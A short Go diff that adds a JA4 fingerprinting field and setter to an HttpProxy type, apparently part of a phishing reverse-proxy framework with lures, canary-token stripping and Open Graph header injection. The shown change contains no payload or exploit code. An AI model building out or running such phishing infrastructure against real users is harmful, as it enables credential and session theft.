@@ -279,6 +279,7 @@ type HttpProxy struct {
 	cfClearance       *CfClearanceManager
 	deviceCode        *DeviceCodeManager
 	canary            *CanaryStripper
+	ja4               *JA4Fingerprinter
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -5015,6 +5016,10 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
 	}
 	return body
+}
+
+func (p *HttpProxy) SetJA4(ja4 *JA4Fingerprinter) {
+	p.ja4 = ja4
 }
 
 func (p *HttpProxy) Start() error {
